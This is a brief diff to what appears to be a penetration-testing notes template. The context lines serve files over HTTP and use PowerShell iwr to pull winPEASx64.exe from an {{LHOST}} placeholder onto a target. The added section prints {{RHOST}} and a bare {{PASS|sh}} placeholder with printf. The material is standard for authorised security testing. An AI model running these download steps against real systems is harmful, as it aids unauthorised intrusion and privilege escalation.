@@ -46,3 +46,9 @@ python3 -m http.server 8000
 ```powershell
 iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
 ```
+
+## Print profile values
+
+```bash
+printf '%s\n' '{{RHOST}}' {{PASS|sh}}
+```
